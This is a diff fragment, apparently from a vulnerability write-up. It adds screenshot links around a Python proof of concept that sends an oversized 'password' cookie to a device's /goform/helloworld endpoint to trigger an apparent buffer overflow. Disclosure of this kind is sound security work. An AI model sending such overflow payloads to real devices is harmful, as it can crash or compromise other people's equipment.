@@ -20,5 +20,7 @@ import requests
 URL = "http://192.168.2.3:80/goform/helloworld"
 cookie = {"Cookie":"password="+"a"*0x400+".pngAAA"}
 requests.get(url=URL, cookies=cookie)
-
+![image](https://github.com/user-attachments/assets/6633936a-a48d-4092-bb4d-26a2281e47e0)
 ![image](https://github.com/user-attachments/assets/c1a89751-2276-4f9b-be2a-1fba6a3be880)
+![image](https://github.com/user-attachments/assets/0328f247-0fb4-4dfd-842f-e4087b3c45d3)
+
